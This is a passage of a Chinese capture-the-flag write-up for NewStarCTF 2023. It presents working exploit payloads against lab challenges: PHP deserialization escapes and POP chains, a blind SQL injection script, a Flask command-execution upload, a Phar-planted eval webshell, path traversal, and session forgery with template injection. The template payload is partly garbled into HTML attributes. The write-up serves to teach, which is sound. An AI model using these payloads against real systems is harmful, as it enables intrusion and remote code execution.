+</span><span class="z-text z-plain">            wishid: "2TrumXdm9HTH9SZvgNPaHmAx",
+</span><span class="z-text z-plain">            date: "2021-09-27",
+</span><span class="z-text z-plain">            place: "学園都市",
+</span><span class="z-text z-plain">            contact: "御坂美琴",
+</span><span class="z-text z-plain">            reason: "海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{c2c65ecd-d8d1-4b68-8003-5e608c0dc222}です",
+</span><span class="z-text z-plain">            timestamp: 1190726040836
+</span><span class="z-text z-plain">        },
+</span><span class="z-text z-plain">        ...
+</span><span class="z-text z-plain">    ]
+</span><span class="z-text z-plain">}
+</span></code></pre><h3 id=week-4-tao>[Week 4]逃<a aria-label="Anchor link for: week-4-tao" class=zola-anchor href=#week-4-tao style=visibility:hidden></a></h3><p>这题考察的是 PHP 反序列化逃逸。<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">function waf($str){
+</span><span class="z-text z-plain">    return str_replace("bad","good",$str);
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class GetFlag {
+</span><span class="z-text z-plain">    public $key;
+</span><span class="z-text z-plain">    public $cmd = "whoami";
+</span><span class="z-text z-plain">    public function __construct($key)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->key = $key;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        system($this->cmd);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">unserialize(waf(serialize(new GetFlag($_GET['key']))));
+</span></code></pre><p>可控的属性为 <code>key</code> ，并且可以通过 waf 中的替换来实现反序列化逃逸的效果。<pre class=z-code><code><span class="z-text z-plain">$getFlag = new GetFlag('');
+</span><span class="z-text z-plain">echo '&LTbr>'.serialize($getFlag).'&LTbr>';
+</span><span class="z-text z-plain">echo waf(serialize($getFlag)).'&LTbr>';
+</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+</span></code></pre><p>需要通过逃逸构造出 <code>";s:3:"cmd";s:4:"ls /";}</code> 共 24 个字符，又因为 bad 替换成 good 后即增加一位，因此需要循环 24 次 bad 来进行逃逸。<pre class=z-code><code><span class="z-text z-plain">$getFlag = new GetFlag(str_repeat("bad", 24).'";s:3:"cmd";s:4:"ls /";}');
+</span><span class="z-text z-plain">echo '&LTbr>'.serialize($getFlag).'&LTbr>';
+</span><span class="z-text z-plain">echo waf(serialize($getFlag)).'&LTbr>';
+</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:96:"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:96:"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+</span></code></pre><p>构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
+</span></code></pre><p>即可输出跟目录的内容，同理构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
+</span></code></pre><p>即可得到 flag。<h3 id=week-4-more-fast>[Week 4]More Fast<a aria-label="Anchor link for: week-4-more-fast" class=zola-anchor href=#week-4-more-fast style=visibility:hidden></a></h3><ul><li></ul><p>GC 回收<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Start{
+</span><span class="z-text z-plain">    public $errMsg;
+</span><span class="z-text z-plain">    public function __destruct() {
+</span><span class="z-text z-plain">        die($this->errMsg);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Pwn{
+</span><span class="z-text z-plain">    public $obj;
+</span><span class="z-text z-plain">    public function __invoke(){
+</span><span class="z-text z-plain">        $this->obj->evil();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    public function evil() {
+</span><span class="z-text z-plain">        phpinfo();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Reverse{
+</span><span class="z-text z-plain">    public $func;
+</span><span class="z-text z-plain">    public function __get($var) {
+</span><span class="z-text z-plain">        ($this->func)();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Web{
+</span><span class="z-text z-plain">    public $func;
+</span><span class="z-text z-plain">    public $var;
+</span><span class="z-text z-plain">    public function evil() {
+</span><span class="z-text z-plain">        if(!preg_match("/flag/i",$this->var)){
+</span><span class="z-text z-plain">            ($this->func)($this->var);
+</span><span class="z-text z-plain">        }else{
+</span><span class="z-text z-plain">            echo "Not Flag";
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Crypto{
+</span><span class="z-text z-plain">    public $obj;
+</span><span class="z-text z-plain">    public function __toString() {
+</span><span class="z-text z-plain">        $wel = $this->obj->good;
+</span><span class="z-text z-plain">        return "NewStar";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Misc{
+</span><span class="z-text z-plain">    public function evil() {
+</span><span class="z-text z-plain">        echo "good job but nothing";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$a = @unserialize($_POST['fast']);
+</span><span class="z-text z-plain">throw new Exception("Nope");
+</span></code></pre><blockquote><p>在PHP中，使用 <code>引用计数</code> 和 <code>回收周期</code> 来自动管理内存对象的，当一个变量被设置为 <code>NULL</code> ，或者没有任何指针指向 时，它就会被变成垃圾，被 <code>GC</code> 机制自动回收掉 那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被 <code>GC</code> 机制回收，在回收的过程中，它会自动触发 <code>_destruct</code> 方法，而这也就是我们绕过抛出异常的关键点。<p>https://xz.aliyun.com/t/11843</blockquote><p>当 Unserialize 运行失败时，则会对运行中的已经创建出来的类进行销毁，提前触发 __destruct 函数。<p>触发 GC 机制的方法：<ul><li></ul><p>对象被 unset() 函数处理；<ul><li></ul><p>数组对象为 NULL 。<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">show_source(__FILE__);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class B {
+</span><span class="z-text z-plain">  function __destruct() {
+</span><span class="z-text z-plain">    global $flag;
+</span><span class="z-text z-plain">    echo $flag;
+</span><span class="z-text z-plain">  }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$a=array(new B,0);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">echo serialize($a);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">// a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
+</span><span class="z-text z-plain">// 数组:长度为2::{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0
+</span></code></pre><p>将第二个索引值设为空 ，就可以触发 GC 回收机制。<p>POP 链如下：<pre class=z-code><code><span class="z-text z-plain">Start::__destruct()->Crypto::__toString()->Reverse::__get($var)->Pwn::__invoke()->Web::evil()
+</span></code></pre><pre class=z-code><code><span class="z-text z-plain">$p = new Pwn();
+</span><span class="z-text z-plain">$p->obj = new Web;
+</span><span class="z-text z-plain">$p->obj->func = "system";
+</span><span class="z-text z-plain">$p->obj->var = "ls /";
+</span><span class="z-text z-plain">$r = new Reverse();
+</span><span class="z-text z-plain">$r->func = $p;
+</span><span class="z-text z-plain">$c = new Crypto();
+</span><span class="z-text z-plain">$c->obj = $r;
+</span><span class="z-text z-plain">$s = new Start();
+</span><span class="z-text z-plain">$s->errMsg = $c;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$a = array($s, 0);
+</span><span class="z-text z-plain">echo serialize($a);
+</span><span class="z-text z-plain">// a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:1;i:0;}
+</span></code></pre><p>通过将第二个索引 <code>i:1</code> 修改为 <code>i:0</code> 即可出发 GC 回收机制，构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:0;i:0;}
+</span></code></pre><p>即可得到目录，再构造 Payload 如下即可得到 flag 。<pre class=z-code><code><span class="z-text z-plain">fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;i:0;}
+</span></code></pre><h3 id=week-4-midsql>[Week 4]midsql<a aria-label="Anchor link for: week-4-midsql" class=zola-anchor href=#week-4-midsql style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">$cmd = "select name, price from items where id = ".$_REQUEST["id"];
+</span><span class="z-text z-plain">$result = mysqli_fetch_all($result);
+</span><span class="z-text z-plain">$result = $result[0];
+</span></code></pre><p>经过尝试无论输入什么正确的都只会回显 <code>你不会以为我真的会告诉你结果吧</code> ，猜测需要进行盲注，先通过构造不同的 Payload 判断哪些被进行了过滤需要进行绕过。<p>经过测试，空格、等号被绕过了，可以通过 <code>/**/</code> 和 <code>like</code> 进行绕过。<pre class=z-code><code><span class="z-text z-plain">import time
+</span><span class="z-text z-plain">import socket
+</span><span class="z-text z-plain">import requests
+</span><span class="z-text z-plain">import requests.packages.urllib3.util.connection as urllib3_conn
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">urllib3_conn.allowed_gai_family = lambda: socket.AF_INET
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">session = requests.Session()
+</span><span class="z-text z-plain">def getDatabase():
+</span><span class="z-text z-plain">    results = []
+</span><span class="z-text z-plain">    for i in range(1, 1000):
+</span><span class="z-text z-plain">        print(f'{i}...')
+</span><span class="z-text z-plain">        start = -1 
+</span><span class="z-text z-plain">        end = 255
+</span><span class="z-text z-plain">        mid = -1
+</span><span class="z-text z-plain">        while start < end:
+</span><span class="z-text z-plain">            mid = (start + end) // 2
+</span><span class="z-text z-plain">            url = "http://c968b372-387a-4e4b-b157-b99e627c3a66.node5.buuoj.cn:81/"
+</span><span class="z-text z-plain">            params = {"id": f"1/**/and/**/if(ascii(substr(database(),{i},1))>{mid},sleep(1),1)#"}
+</span><span class="z-text z-plain">            ret = session.get(url, params=params)
+</span><span class="z-text z-plain">            assert ret.status_code == 200, f'code: {ret.status_code}'
+</span><span class="z-text z-plain">            assert '429 Too Many Requests' not in ret.text
+</span><span class="z-text z-plain">            if ret.elapsed.total_seconds() >= 1:
+</span><span class="z-text z-plain">                start = mid + 1
+</span><span class="z-text z-plain">            else:
+</span><span class="z-text z-plain">                end = mid
+</span><span class="z-text z-plain">            time.sleep(0.05)
+</span><span class="z-text z-plain">        if mid == -1:
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">        results.append(chr(start))
+</span><span class="z-text z-plain">        print(''.join(results))
+</span><span class="z-text z-plain">    return ''.join(results)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">begin = time.time()
+</span><span class="z-text z-plain">getDatabase()
+</span><span class="z-text z-plain">print(f'time spend: {time.time() - begin}')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">"""
+</span><span class="z-text z-plain">1...
+</span><span class="z-text z-plain">c
+</span><span class="z-text z-plain">2...
+</span><span class="z-text z-plain">ct
+</span><span class="z-text z-plain">3...
+</span><span class="z-text z-plain">ctf
+</span><span class="z-text z-plain">4...
+</span><span class="z-text z-plain">time spend: 16.405414819717407
+</span><span class="z-text z-plain">"""
+</span></code></pre><p>可以得出数据库名为 <code>ctf</code> 。<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{i},1))>{mid},sleep(1),1)#"}
+</span></code></pre><p>可以得出表名为 <code>items</code> 。<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/table_name/**/like'items'),{i},1))>{mid},sleep(1),1)#"}
+</span></code></pre><p>可以得出字段名为 <code>id,name,price</code> 。<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(1),1)#"}
+</span></code></pre><p>可以得出值 <code>1lolita1000,520lolita's flag is flag{647190d8-7511-4386-b513-15440eb033be}1688</code> 。<h3 id=week-4-flask-disk>[Week 4]Flask Disk<a aria-label="Anchor link for: week-4-flask-disk" class=zola-anchor href=#week-4-flask-disk style=visibility:hidden></a></h3><p>根据题目已知框架为 Flask ，通过 <code>admin manage</code> 已知开启了 Debug 模式，在该模式下修改 <code>app.py</code> 会立即加载，通过 Upload 上传新的 <code>app.py</code> 。<pre class=z-code><code><span class="z-text z-plain">from flask import *
+</span><span class="z-text z-plain">import os
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">app = Flask(__name__)
+</span><span class="z-text z-plain">@app.route('/')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def index():
+</span><span class="z-text z-plain">    try:
+</span><span class="z-text z-plain">        cmd = request.args.get('1')
+</span><span class="z-text z-plain">        data = os.popen(cmd).read()
+</span><span class="z-text z-plain">        return data
+</span><span class="z-text z-plain">    except:
+</span><span class="z-text z-plain">        pass
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    return "1"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if __name__ == '__main__':
+</span><span class="z-text z-plain">    app.run(host='0.0.0.0',port=5000,debug=True)
+</span></code></pre><p>上传后通过构造 Payload 获得 flag 。<pre class=z-code><code><span class="z-text z-plain">1=cat /flag
+</span></code></pre><h3 id=week-4-pharone>[Week 4]PharOne<a aria-label="Anchor link for: week-4-pharone" class=zola-anchor href=#week-4-pharone style=visibility:hidden></a></h3><p>查看源代码可以发现提示 <code>class.php</code> ，通过查看可以得到源码如下。<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">class Flag{
+</span><span class="z-text z-plain">    public $cmd;
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        @exec($this->cmd);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">@unlink($_POST['file']);
+</span></code></pre><p>结合标题可以通过 Phar 反序列化来写入 WebShell ，经过随机上传发现存在文件类型检测。<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">class Flag{
+</span><span class="z-text z-plain">    public $cmd;
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$a=new Flag();
+</span><span class="z-text z-plain">$a->cmd="echo \"&LT?=@eval(\\\$_POST[1]);\">/var/www/html/1.php";
+</span><span class="z-text z-plain">$phar = new Phar("1.phar");
+</span><span class="z-text z-plain">$phar->startBuffering();
+</span><span class="z-text z-plain">$phar->setStub("&LT?php __HALT_COMPILER(); ?>");
+</span><span class="z-text z-plain">$phar->setMetadata($a);
+</span><span class="z-text z-plain">$phar->addFromString("test.txt", "test");
+</span><span class="z-text z-plain">$phar->stopBuffering();
+</span></code></pre><p>通过上传发现存在过滤 <code>!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)</code> ，可以通过 gzip 压缩进行绕过。<pre class=z-code><code><span class="z-text z-plain">$ gzip -f 1.phar
+</span><span class="z-text z-plain">$ mv 1.phar.gz 1.jpg
+</span></code></pre><p>修改好后进行上传得到回显如下。<pre class=z-code><code><span class="z-text z-plain">Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+</span></code></pre><p>再通过构造 Payload 如下即可上传恶意 WebShell 。<pre class=z-code><code><span class="z-text z-plain">// class.php
+</span><span class="z-text z-plain">file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+</span></code></pre><p>此时通过构造 Payload 如下即可获得 flag 。<pre class=z-code><code><span class="z-text z-plain">// 1.php
+</span><span class="z-text z-plain">1=system("cat /f*");
+</span></code></pre><h3 id=week-4-injectme>[Week 4]InjectMe<a aria-label="Anchor link for: week-4-injectme" class=zola-anchor href=#week-4-injectme style=visibility:hidden></a></h3><p>附件：Dockerfile<pre class=z-code><code><span class="z-text z-plain">FROM vulhub/flask:1.1.1
+</span><span class="z-text z-plain">ENV FLAG=flag{not_here}
+</span><span class="z-text z-plain">  src/ /app
+</span><span class="z-text z-plain">RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
+</span><span class="z-text z-plain">CMD [ "/start.sh" ]
+</span><span class="z-text z-plain">EXPOSE 8080
+</span></code></pre><p>可以得出站点目录在 <code>/app</code> 中，通过查看图片 <code>110.jpg</code> 可以得到部分源码。<p>可以发现 <code>../</code> 被替换成了空，但是可以通过类似双写的方法进行绕过从而实现路径穿越，构造 Payload 如下。<pre class=z-code><code><span class="z-text z-plain">/download?file=..././..././..././app/app.py
+</span></code></pre><p>可以得到 <code>app.py</code> 的源码如下。<pre class=z-code><code><span class="z-text z-plain">import os
+</span><span class="z-text z-plain">import re
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">from flask import Flask, render_template, request, abort, send_file, session, render_template_string
+</span><span class="z-text z-plain">from config import secret_key
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">app = Flask(__name__)
+</span><span class="z-text z-plain">app.secret_key = secret_key
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.route('/')
+</span><span class="z-text z-plain">def hello_world():  # put application's code here
+</span><span class="z-text z-plain">    return render_template('index.html')
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.route("/cancanneed", methods=["GET"])
+</span><span class="z-text z-plain">def cancanneed():
+</span><span class="z-text z-plain">    all_filename = os.listdir('./static/img/')
+</span><span class="z-text z-plain">    filename = request.args.get('file', '')
+</span><span class="z-text z-plain">    if filename:
+</span><span class="z-text z-plain">        return render_template('img.html', filename=filename, all_filename=all_filename)
+</span><span class="z-text z-plain">    else:
+</span><span class="z-text z-plain">        return f"{str(os.listdir('./static/img/'))} &LTbr> &LTa href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&LT/a>"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.route("/download", methods=["GET"])
+</span><span class="z-text z-plain">def download():
+</span><span class="z-text z-plain">    filename = request.args.get('file', '')
+</span><span class="z-text z-plain">    if filename:
+</span><span class="z-text z-plain">        filename = filename.replace('../', '')
+</span><span class="z-text z-plain">        filename = os.path.join('static/img/', filename)
+</span><span class="z-text z-plain">        print(filename)
+</span><span class="z-text z-plain">        if (os.path.exists(filename)) and ("start" not in filename):
+</span><span class="z-text z-plain">            return send_file(filename)
+</span><span class="z-text z-plain">        else:
+</span><span class="z-text z-plain">            abort(500)
+</span><span class="z-text z-plain">    else:
+</span><span class="z-text z-plain">        abort(404)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.route('/backdoor', methods=["GET"])
+</span><span class="z-text z-plain">def backdoor():
+</span><span class="z-text z-plain">    try:
+</span><span class="z-text z-plain">        print(session.get("user"))
+</span><span class="z-text z-plain">        if session.get("user") is None:
+</span><span class="z-text z-plain">            session['user'] = "guest"
+</span><span class="z-text z-plain">        name = session.get("user")
+</span><span class="z-text z-plain">        if re.findall(
+</span><span class="z-text z-plain">                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
+</span><span class="z-text z-plain">                name):
+</span><span class="z-text z-plain">            abort(500)
+</span><span class="z-text z-plain">        else:
+</span><span class="z-text z-plain">            return render_template_string(
+</span><span class="z-text z-plain">                '竟然给&LTh1>%s&LT/h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &LTbr> 那么 现在轮到你了!&LTbr> 最后祝您玩得愉快!😁' % name)
+</span><span class="z-text z-plain">    except Exception:
+</span><span class="z-text z-plain">        abort(500)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.errorhandler(404)
+</span><span class="z-text z-plain">def page_not_find(e):
+</span><span class="z-text z-plain">    return render_template('404.html'), 404
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@app.errorhandler(500)
+</span><span class="z-text z-plain">def internal_server_error(e):
+</span><span class="z-text z-plain">    return render_template('500.html'), 500
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">if __name__ == '__main__':
+</span><span class="z-text z-plain">    app.run('0.0.0.0', port=8080)
+</span></code></pre><p>通过分析 backdoor 函数可知需要进行 session 伪造来修改 <code>session['user']</code> ，通过源码可知 <code>secret_key</code> 位于 <code>config.py</code> 中，通过上述相同方法获取，回显如下。<pre class=z-code><code><span class="z-text z-plain">secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
+</span></code></pre><pre class=z-code><code><span class="z-text z-plain">$ python .\flask_session_cookie_manager3.py decode -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
+</span><span class="z-text z-plain">AoCqDY"
+</span><span class="z-text z-plain">{'user': 'guest'}
+</span></code></pre><p>成功 decode 后，还需要进行绕过，编写一个 Python 脚本如下。<pre class=z-code><code><span class="z-text z-plain">import subprocess
+</span><span class="z-text z-plain">import requests
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">payload = '&LTdiv data-gb-custom-block data-tag="set" data-i=''>&LT/div>&LTdiv data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='l' data-32='~' data-33='s' data-34='10' data-35='10' data-36='0' data-37='/' data-38='))[' data-39='read'>&LT/div>'
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def getSession():
+</span><span class="z-text z-plain">    command = ['python', 'flask_session_cookie_manager3.py', 'encode', '-t',
+</span><span class="z-text z-plain">               "{{'user':'{0}'}}".format(payload), '-s',
+</span><span class="z-text z-plain">               "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"]
+</span><span class="z-text z-plain">    result = subprocess.run(command, capture_output=True, text=True)
+</span><span class="z-text z-plain">    output = result.stdout.strip()
+</span><span class="z-text z-plain">    return output
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">a = getSession()
+</span><span class="z-text z-plain">print(a)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">url = "http://cc52e144-c6c3-4b89-abcc-472db5bf1e69.node5.buuoj.cn:81/backdoor"
+</span><span class="z-text z-plain">cookies = {"session": a}
+</span><span class="z-text z-plain">res = requests.get(url=url, cookies=cookies)
+</span><span class="z-text z-plain">print(res.text)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">"""
+</span><span class="z-text z-plain">竟然给&LTh1>app
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">boot
+</span><span class="z-text z-plain">dev
+</span><span class="z-text z-plain">etc
+</span><span class="z-text z-plain">home
+</span><span class="z-text z-plain">lib
+</span><span class="z-text z-plain">lib64
+</span><span class="z-text z-plain">media
+</span><span class="z-text z-plain">mnt
+</span><span class="z-text z-plain">opt
+</span><span class="z-text z-plain">proc
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">run
+</span><span class="z-text z-plain">sbin
+</span><span class="z-text z-plain">srv
+</span><span class="z-text z-plain">start.sh
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">tmp
+</span><span class="z-text z-plain">usr
+</span><span class="z-text z-plain">var
+</span><span class="z-text z-plain">y0U3_f14g_1s_h3re
+</span><span class="z-text z-plain">&LT/h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &LTbr> 那么 现在轮到你了!&LTbr> 最后祝您玩得愉快!😁
+</span><span class="z-text z-plain">"""
+</span></code></pre><p>发现成功绕过并且获得 flag 文件名 <code>y0U3_f14g_1s_h3re</code> ，通过修改脚本如下即可得到 flag 。<pre class=z-code><code><span class="z-text z-plain">payload = '&LTdiv data-gb-custom-block data-tag="set" data-i=''>&LT/div>&LTdiv data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='c' data-32='~' data-33='at' data-34='10' data-35='10' data-36='0' data-37='/y0U3_f14g_1s_h3re' data-38='))[' data-39='read'>&LT/div>'
+</span></code></pre><h2 id=misc>Misc<a aria-label="Anchor link for: misc" class=zola-anchor href=#misc style=visibility:hidden></a></h2><h3 id=week-1-cyberchef-s-secret>[Week 1]CyberChef’s Secret<a aria-label="Anchor link for: week-1-cyberchef-s-secret" class=zola-anchor href=#week-1-cyberchef-s-secret style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)
+</span><span class="z-text z-plain">M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=
+</span></code></pre><p>CyberChef 一把梭，flag 如下<pre class=z-code><code><span class="z-text z-plain">flag{Base_15_S0_Easy_^_^}
+</span></code></pre><h3 id=week-1-ji-mi-tu-pian>[Week 1]机密图片<a aria-label="Anchor link for: week-1-ji-mi-tu-pian" class=zola-anchor href=#week-1-ji-mi-tu-pian style=visibility:hidden></a></h3><p>通过 zteg 可以得到 flag。<pre class=z-code><code><span class="z-text z-plain">┌──(kali㉿kali)-[~/Desktop]
+</span><span class="z-text z-plain">└─$ zsteg secret.png
+</span><span class="z-text z-plain">b1,r,lsb,xy         .. text: ":=z^rzwPQb"
+</span><span class="z-text z-plain">b1,g,lsb,xy         .. file: OpenPGP Public Key
+</span><span class="z-text z-plain">b1,b,lsb,xy         .. file: OpenPGP Secret Key
+</span><span class="z-text z-plain">b1,rgb,lsb,xy       .. text: "flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}"
+</span><span class="z-text z-plain">b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive
+</span><span class="z-text z-plain">b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo
